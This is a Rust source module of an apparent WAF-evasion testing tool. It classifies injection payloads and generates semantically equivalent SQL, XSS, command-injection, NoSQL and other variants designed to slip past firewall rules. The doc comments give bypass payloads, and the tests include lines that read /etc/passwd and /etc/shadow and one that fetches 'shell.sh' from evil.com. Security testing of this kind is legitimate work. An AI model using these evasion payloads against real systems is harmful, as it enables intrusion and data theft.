//! Grammar-aware payload mutation engine.
//!
//! This is WAF Rift's key differentiator. Instead of applying blind
//! syntactic transforms (URL-encode everything, insert comments), this
//! module understands the *semantics* of SQL, XSS, and command injection
//! payloads and generates equivalent variants that look completely
//! different to regex-based WAF rules.
//!
//! # Why this matters
//!
//! A WAF blocking `' OR 1=1--` and `<script>alert(1)</script>` will
//! miss these semantically identical payloads:
//!
//! ```text
//! SQL:  ' OR 'a' LIKE 'a'#
//! XSS:  <details open ontoggle=confirm`1`>
//! CMD:  ${IFS}c\at${IFS}/???/??ss??
//! ```
//!
//! # Architecture
//!
//! ```text
//! ┌─────────────┐
//! │ Classifier   │ ← Detects SQL, XSS, or CMD injection type
//! ├─────────────┤
//! │ SQL Mutator  │ ← Tautology swap, string split, UNION variants
//! │ XSS Mutator  │ ← Tag/event combos, exec functions, URI schemes
//! │ CMD Mutator  │ ← IFS tricks, path wildcards, variable indirection
//! ├─────────────┤
//! │ Combiner     │ ← Layers grammar mutations with encoding strategies
//! └─────────────┘
//! ```

pub mod cassandra;
pub mod cmd;
pub mod cmd_windows;
pub mod elastic;
pub mod ldap;
pub mod mongo;
pub mod path_traversal;
pub mod polyglot;
pub mod redis;
pub mod sql;
pub mod ssrf;
pub mod template;
pub mod xss;

/// What type of injection payload this is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub enum PayloadType {
    /// SQL injection (`SQLi`).
    Sql,
    /// Cross-site scripting (XSS).
    Xss,
    /// Operating system command injection.
    CommandInjection,
    /// LDAP injection.
    Ldap,
    /// Server-side request forgery (SSRF).
    Ssrf,
    /// Path/directory traversal.
    PathTraversal,
    /// Server-side template injection (SSTI).
    TemplateInjection,
    /// `NoSQL` injection (`MongoDB`, Elastic, Redis, Cassandra).
    NoSql,
    /// Unknown — not clearly one of the above.
    Unknown,
}

/// A grammar-aware mutation of any payload type.
#[derive(Debug, Clone)]
pub struct GrammarMutation {
    /// The mutated payload.
    pub payload: String,
    /// What type of injection this is.
    pub payload_type: PayloadType,
    /// Human-readable description of the mutation.
    pub description: String,
    /// Which grammar rules were applied.
    pub rules_applied: Vec<&'static str>,
}

/// Diversity policy for mutation generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DiversityPolicy {
    /// Pure random selection.
    Random,
    /// Coverage-guided: prefer unseen rule combinations.
    CoverageGuided,
    /// Target specific rule families.
    RuleTargeted(&'static [&'static str]),
}

/// Advanced mutation request with fine-grained control.
#[derive(Debug, Clone)]
pub struct MutationRequest {
    /// Maximum number of variants to generate.
    pub max_count: usize,
    /// Diversity policy to apply.
    pub diversity: DiversityPolicy,
    /// Explicitly exclude payloads matching these strings.
    pub exclude: std::collections::HashSet<String>,
}

impl Default for MutationRequest {
    fn default() -> Self {
        Self {
            max_count: 10,
            diversity: DiversityPolicy::Random,
            exclude: std::collections::HashSet::new(),
        }
    }
}

/// Classify a payload as SQL injection, XSS, or command injection.
///
/// Uses heuristic keyword matching. The classifier errs on the side of
/// returning `Unknown` rather than misclassifying — a misclassification
/// would apply wrong grammar rules and produce broken payloads.
#[must_use]
pub fn classify(payload: &str) -> PayloadType {
    let lower = payload.to_ascii_lowercase();

    // SQL indicators (weighted — require multiple signals)
    let sql_signals: u32 = [
        lower.contains("select"),
        lower.contains("union"),
        lower.contains("insert"),
        lower.contains("update"),
        lower.contains("delete"),
        lower.contains("drop"),
        lower.contains(" or ") && (lower.contains('=') || lower.contains("like")),
        lower.contains(" and ") && lower.contains('='),
        lower.contains("1=1"),
        lower.contains("--") && (lower.contains('\'') || lower.contains('=')),
        lower.contains('\'') && lower.contains('='),
        lower.contains("order by"),
        lower.contains("group by"),
        lower.contains("having"),
        lower.contains("sleep("),
        lower.contains("benchmark("),
        lower.contains("waitfor"),
    ]
    .iter()
    .filter(|&&x| x)
    .count() as u32;

    // XSS indicators
    let xss_signals: u32 = [
        lower.contains("<script"),
        lower.contains("</script"),
        lower.contains("onerror"),
        lower.contains("onload"),
        lower.contains("onclick"),
        lower.contains("onfocus"),
        lower.contains("onmouseover"),
        lower.contains("alert("),
        lower.contains("confirm("),
        lower.contains("prompt("),
        lower.contains("javascript:"),
        lower.contains("<img"),
        lower.contains("<svg"),
        lower.contains("<iframe"),
        lower.contains("<body"),
        lower.contains("document.cookie"),
        lower.contains("eval("),
    ]
    .iter()
    .filter(|&&x| x)
    .count() as u32;

    // Command injection indicators
    let cmd_signals: u32 = [
        lower.contains("; ") && contains_shell_command(&lower),
        lower.contains("| ") && contains_shell_command(&lower),
        lower.contains("&& ") && contains_shell_command(&lower),
        lower.contains("|| ") && contains_shell_command(&lower),
        lower.contains('`') && contains_shell_command(&lower),
        lower.contains("$(") && contains_shell_command(&lower),
        lower.contains("/etc/passwd"),
        lower.contains("/etc/shadow"),
        lower.contains("/bin/"),
        lower.contains("${ifs}"),
        contains_shell_command(&lower) && lower.starts_with([';', '|']),
    ]
    .iter()
    .filter(|&&x| x)
    .count() as u32;

    // Return the type with the highest signal count (min 1 signal required)
    if sql_signals >= xss_signals && sql_signals >= cmd_signals && sql_signals >= 1 {
        PayloadType::Sql
    } else if xss_signals >= sql_signals && xss_signals >= cmd_signals && xss_signals >= 1 {
        PayloadType::Xss
    } else if cmd_signals >= 1 {
        // Before accepting CMDi, check if this is actually path traversal.
        // A bare "../../../etc/passwd" has no shell separator — it's LFI, not CMDi.
        // CMDi requires at least one separator-triggered signal (;, |, &&, ||, `, $()
        // or ${IFS}). If the only match is /etc/passwd or /bin/ without a separator,
        // it's path traversal.
        let has_separator_signal = (lower.contains("; ") && contains_shell_command(&lower))
            || (lower.contains("| ") && contains_shell_command(&lower))
            || (lower.contains("&& ") && contains_shell_command(&lower))
            || (lower.contains("|| ") && contains_shell_command(&lower))
            || (lower.contains('`') && contains_shell_command(&lower))
            || (lower.contains("$(") && contains_shell_command(&lower))
            || lower.contains("${ifs}")
            || (contains_shell_command(&lower) && lower.starts_with([';', '|']));
        if has_separator_signal {
            PayloadType::CommandInjection
        } else if path_traversal::detect_type(payload) {
            PayloadType::PathTraversal
        } else {
            // Pre-fix this fell through to CommandInjection even with no
            // separator. A bare `/etc/passwd` or `/bin/ls` token is path
            // disclosure / LFI, not command injection — without `; | &
            // && || $() ` `${IFS}` we cannot claim the shell was reached.
            // Try the remaining specific types before defaulting.
            if ldap::detect_type(payload) {
                PayloadType::Ldap
            } else if ssrf::detect_type(payload) {
                PayloadType::Ssrf
            } else if template::detect_type(payload) {
                PayloadType::TemplateInjection
            } else if mongo::detect_type(payload)
                || elastic::detect_type(payload)
                || redis::detect_type(payload)
                || cassandra::detect_type(payload)
            {
                PayloadType::NoSql
            } else {
                PayloadType::Unknown
            }
        }
    } else {
        // No core type match — check extended types
        if ldap::detect_type(payload) {
            PayloadType::Ldap
        } else if ssrf::detect_type(payload) {
            PayloadType::Ssrf
        } else if path_traversal::detect_type(payload) {
            PayloadType::PathTraversal
        } else if template::detect_type(payload) {
            PayloadType::TemplateInjection
        } else if mongo::detect_type(payload)
            || elastic::detect_type(payload)
            || redis::detect_type(payload)
            || cassandra::detect_type(payload)
        {
            PayloadType::NoSql
        } else {
            PayloadType::Unknown
        }
    }
}

/// Check if a string contains a common shell command as a whole token.
///
/// Pre-fix this used `.contains()` substring matching, so short command
/// names like `id` and `nc` matched as substrings inside ordinary words —
/// `consider`, `validate`, `android`, `since`, `concert`. The classifier
/// would then mis-route benign text as command injection.
fn contains_shell_command(s: &str) -> bool {
    // Patterns that already include a trailing space act as their own
    // boundary on the right. The remaining bare commands need whole-word
    // matching.
    let prefixed = ["cat ", "ls ", "wget ", "curl ", "ping ", "nc ", "dig "];
    if prefixed.iter().any(|cmd| s.contains(cmd)) {
        return true;
    }
    let bare = [
        "id", "whoami", "bash", "sh", "python", "perl", "ruby", "php", "uname", "env", "printenv",
        "nslookup", "ifconfig", "ip addr",
    ];
    let bytes = s.as_bytes();
    let is_boundary = |b: u8| -> bool {
        matches!(
            b,
            b' ' | b'\t'
                | b'\n'
                | b'\r'
                | b';'
                | b'|'
                | b'&'
                | b'`'
                | b'$'
                | b'('
                | b')'
                | b'<'
                | b'>'
                | b'\''
                | b'"'
                | b'/'
                | b'\\'
                | 0
        )
    };
    bare.iter().any(|cmd| {
        let cmd_bytes = cmd.as_bytes();
        if cmd_bytes.is_empty() || bytes.len() < cmd_bytes.len() {
            return false;
        }
        let mut i = 0;
        while i + cmd_bytes.len() <= bytes.len() {
            if bytes[i..i + cmd_bytes.len()] == *cmd_bytes {
                let left_ok = i == 0 || is_boundary(bytes[i - 1]);
                let right_ok =
                    i + cmd_bytes.len() == bytes.len() || is_boundary(bytes[i + cmd_bytes.len()]);
                if left_ok && right_ok {
                    return true;
                }
            }
            i += 1;
        }
        false
    })
}

/// Generate grammar-aware mutations for any payload.
///
/// Automatically classifies the payload type and generates semantically
/// equivalent variants using the appropriate grammar module. If the type
/// is known in advance, use the specific `sql::mutate`, `xss::mutate`,
/// or `cmd::mutate` functions directly.
///
/// # Arguments
/// * `payload` — The injection payload to mutate
/// * `max_mutations` — Maximum number of variants to generate
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<GrammarMutation> {
    let payload_type = classify(payload);
    mutate_as(payload, payload_type, max_mutations)
}

/// Generate grammar-aware mutations using an advanced request.
#[must_use]
pub fn mutate_request(
    payload: &str,
    payload_type: PayloadType,
    request: &MutationRequest,
) -> Vec<GrammarMutation> {
    let mut base = mutate_as(payload, payload_type, request.max_count);
    if !request.exclude.is_empty() {
        base.retain(|m| !request.exclude.contains(&m.payload));
    }
    match request.diversity {
        DiversityPolicy::Random => base,
        DiversityPolicy::CoverageGuided => {
            // Deduplicate by rules_applied combination
            let mut seen = std::collections::HashSet::new();
            base.into_iter()
                .filter(|m| {
                    let key = m.rules_applied.join(",");
                    if seen.contains(&key) {
                        false
                    } else {
                        seen.insert(key);
                        true
                    }
                })
                .collect()
        }
        DiversityPolicy::RuleTargeted(rules) => base
            .into_iter()
            .filter(|m| m.rules_applied.iter().any(|r| rules.contains(r)))
            .collect(),
    }
}

/// Stream grammar mutations lazily.
pub fn mutate_streaming(
    payload: &str,
    payload_type: PayloadType,
    request: MutationRequest,
) -> impl Iterator<Item = GrammarMutation> {
    mutate_request(payload, payload_type, &request).into_iter()
}

/// Generate grammar-aware mutations for a payload of known type.
///
/// Use this when the payload type is already known (e.g., from a
/// scanner that knows it's testing SQL injection).
#[must_use]
pub fn mutate_as(
    payload: &str,
    payload_type: PayloadType,
    max_mutations: usize,
) -> Vec<GrammarMutation> {
    match payload_type {
        PayloadType::Sql => {
            let mut results: Vec<GrammarMutation> = sql::mutate(payload, max_mutations)
                .into_iter()
                .map(|m| GrammarMutation {
                    payload: m.payload,
                    payload_type: PayloadType::Sql,
                    description: m.description,
                    rules_applied: m.rules_applied,
                })
                .collect();
            // Polyglot SQL+XSS
            if results.len() < max_mutations {
                for p in polyglot::polyglots_for("sql") {
                    if results.len() >= max_mutations {
                        break;
                    }
                    results.push(GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::Sql,
                        description: "SQL+XSS polyglot".into(),
                        rules_applied: vec!["polyglot_sql_xss"],
                    });
                }
            }
            // Defense-in-depth: never exceed the documented contract.
            results.truncate(max_mutations);
            results
        }
        PayloadType::Xss => {
            let mut results: Vec<GrammarMutation> = xss::mutate(payload, max_mutations)
                .into_iter()
                .map(|m| GrammarMutation {
                    payload: m.payload,
                    payload_type: PayloadType::Xss,
                    description: m.description,
                    rules_applied: m.rules_applied,
                })
                .collect();
            results.truncate(max_mutations);
            results
        }
        PayloadType::CommandInjection => {
            let mut results = Vec::new();
            let per = max_mutations / 2 + max_mutations % 2;
            results.extend(
                cmd::mutate(payload, per)
                    .into_iter()
                    .map(|m| GrammarMutation {
                        payload: m.payload,
                        payload_type: PayloadType::CommandInjection,
                        description: m.description,
                        rules_applied: m.rules_applied,
                    }),
            );
            results.extend(
                cmd_windows::mutate(payload, max_mutations - results.len())
                    .into_iter()
                    .map(|m| GrammarMutation {
                        payload: m.payload,
                        payload_type: PayloadType::CommandInjection,
                        description: m.description,
                        rules_applied: m.rules_applied,
                    }),
            );
            // Polyglot CMD+XSS
            if results.len() < max_mutations {
                for p in polyglot::polyglots_for("cmd") {
                    if results.len() >= max_mutations {
                        break;
                    }
                    results.push(GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::CommandInjection,
                        description: "CMD+XSS polyglot".into(),
                        rules_applied: vec!["polyglot_cmd_xss"],
                    });
                }
            }
            results.truncate(max_mutations);
            results
        }
        PayloadType::Ldap => ldap::mutate(payload)
            .into_iter()
            .take(max_mutations)
            .map(|p| GrammarMutation {
                payload: p,
                payload_type: PayloadType::Ldap,
                description: "LDAP filter mutation".into(),
                rules_applied: vec!["ldap_mutation"],
            })
            .collect(),
        PayloadType::Ssrf => ssrf::mutate(payload)
            .into_iter()
            .take(max_mutations)
            .map(|p| GrammarMutation {
                payload: p,
                payload_type: PayloadType::Ssrf,
                description: "SSRF host/scheme mutation".into(),
                rules_applied: vec!["ssrf_mutation"],
            })
            .collect(),
        PayloadType::PathTraversal => path_traversal::mutate(payload)
            .into_iter()
            .take(max_mutations)
            .map(|p| GrammarMutation {
                payload: p,
                payload_type: PayloadType::PathTraversal,
                description: "path traversal encoding mutation".into(),
                rules_applied: vec!["path_traversal_mutation"],
            })
            .collect(),
        PayloadType::TemplateInjection => {
            let mut results: Vec<GrammarMutation> = template::mutate(payload)
                .into_iter()
                .take(max_mutations)
                .map(|p| GrammarMutation {
                    payload: p,
                    payload_type: PayloadType::TemplateInjection,
                    description: "template injection mutation".into(),
                    rules_applied: vec!["template_mutation"],
                })
                .collect();
            // Polyglot SSTI+XSS
            if results.len() < max_mutations {
                for p in polyglot::polyglots_for("ssti") {
                    if results.len() >= max_mutations {
                        break;
                    }
                    results.push(GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::TemplateInjection,
                        description: "SSTI+XSS polyglot".into(),
                        rules_applied: vec!["polyglot_ssti_xss"],
                    });
                }
            }
            results.truncate(max_mutations);
            results
        }
        PayloadType::NoSql => {
            let mut results = Vec::new();
            let per = max_mutations / 4 + 1;
            results.extend(
                mongo::mutate(payload)
                    .into_iter()
                    .take(per)
                    .map(|p| GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::NoSql,
                        description: "MongoDB NoSQL mutation".into(),
                        rules_applied: vec!["nosql_mongo"],
                    }),
            );
            results.extend(elastic::mutate(payload).into_iter().take(per).map(|p| {
                GrammarMutation {
                    payload: p,
                    payload_type: PayloadType::NoSql,
                    description: "Elastic NoSQL mutation".into(),
                    rules_applied: vec!["nosql_elastic"],
                }
            }));
            results.extend(
                redis::mutate(payload)
                    .into_iter()
                    .take(per)
                    .map(|p| GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::NoSql,
                        description: "Redis NoSQL mutation".into(),
                        rules_applied: vec!["nosql_redis"],
                    }),
            );
            results.extend(cassandra::mutate(payload).into_iter().take(per).map(|p| {
                GrammarMutation {
                    payload: p,
                    payload_type: PayloadType::NoSql,
                    description: "Cassandra NoSQL mutation".into(),
                    rules_applied: vec!["nosql_cassandra"],
                }
            }));
            results.truncate(max_mutations);
            results
        }
        PayloadType::Unknown => {
            let mut results = Vec::new();
            let per_type = max_mutations / 5;
            results.extend(mutate_as(payload, PayloadType::Sql, per_type));
            results.extend(mutate_as(payload, PayloadType::Xss, per_type));
            results.extend(mutate_as(payload, PayloadType::CommandInjection, per_type));
            results.extend(mutate_as(payload, PayloadType::NoSql, per_type));
            results.extend(mutate_as(payload, PayloadType::TemplateInjection, per_type));
            results.truncate(max_mutations);
            results
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_sql_injection() {
        assert_eq!(classify("' OR 1=1--"), PayloadType::Sql);
        assert_eq!(
            classify("' UNION SELECT username FROM users--"),
            PayloadType::Sql
        );
        assert_eq!(classify("1' AND 1=1#"), PayloadType::Sql);
    }

    #[test]
    fn classify_xss() {
        assert_eq!(classify("<script>alert(1)</script>"), PayloadType::Xss);
        assert_eq!(classify("<img src=x onerror=alert(1)>"), PayloadType::Xss);
        assert_eq!(
            classify("javascript:alert(document.cookie)"),
            PayloadType::Xss
        );
    }

    #[test]
    fn classify_command_injection() {
        assert_eq!(classify("; cat /etc/passwd"), PayloadType::CommandInjection);
        assert_eq!(classify("| ls -la"), PayloadType::CommandInjection);
        assert_eq!(
            classify("&& wget http://evil.com/shell.sh"),
            PayloadType::CommandInjection
        );
    }

    #[test]
    fn classify_path_traversal_not_cmdi() {
        // Bare path traversal with /etc/passwd should NOT be classified as CMDi
        assert_eq!(classify("../../../etc/passwd"), PayloadType::PathTraversal);
        assert_eq!(
            classify("....//....//....//etc/passwd"),
            PayloadType::PathTraversal
        );
        // But command + separator IS still CMDi
        assert_eq!(classify("; cat /etc/passwd"), PayloadType::CommandInjection);
        assert_eq!(classify("| cat /etc/shadow"), PayloadType::CommandInjection);
    }

    #[test]
    fn classify_unknown() {
        assert_eq!(classify("hello world"), PayloadType::Unknown);
        assert_eq!(classify("normal parameter value"), PayloadType::Unknown);
    }

    #[test]
    fn mutate_auto_classifies() {
        // SQL
        let sql = mutate("' OR 1=1--", 10);
        assert!(!sql.is_empty());
        assert!(sql.iter().all(|m| m.payload_type == PayloadType::Sql));

        // XSS
        let xss = mutate("<script>alert(1)</script>", 10);
        assert!(!xss.is_empty());
        assert!(xss.iter().all(|m| m.payload_type == PayloadType::Xss));

        // CMD
        let cmd = mutate("; cat /etc/passwd", 10);
        assert!(!cmd.is_empty());
        assert!(
            cmd.iter()
                .all(|m| m.payload_type == PayloadType::CommandInjection)
        );
    }

    #[test]
    fn mutate_as_overrides_classification() {
        // Force SQL treatment on an XSS payload
        let result = mutate_as("<script>alert(1)</script>", PayloadType::Sql, 10);
        // Should produce SQL mutations (probably empty/few for XSS input)
        assert!(result.iter().all(|m| m.payload_type == PayloadType::Sql));
    }

    #[test]
    fn unknown_tries_all_types() {
        let result = mutate_as("ambiguous payload", PayloadType::Unknown, 30);
        // May or may not produce results, but should not panic
        assert!(result.len() <= 30);
    }

    #[test]
    fn grammar_mutations_differ_from_encoding() {
        // Grammar mutations should produce semantically different payloads,
        // not just encoded versions of the same string
        let sql = mutate("' OR 1=1--", 20);
        for m in &sql {
            // Tautology mutations should have CHANGED something
            // (Note: some tautologies like IIF(1=1,1,0) contain "1=1"
            // as a substring, which is fine — the structure is different)
            if m.rules_applied.contains(&"tautology_swap") {
                assert_ne!(
                    m.payload, "' OR 1=1--",
                    "tautology_swap should produce a different payload: {}",
                    m.payload
                );
            }
        }
    }

    #[test]
    fn high_volume_does_not_panic() {
        // Stress test: request many mutations
        let _ = mutate("' OR 1=1--", 1000);
        let _ = mutate("<script>alert(1)</script>", 1000);
        let _ = mutate("; cat /etc/passwd", 1000);
        let _ = mutate("", 1000);
    }
}
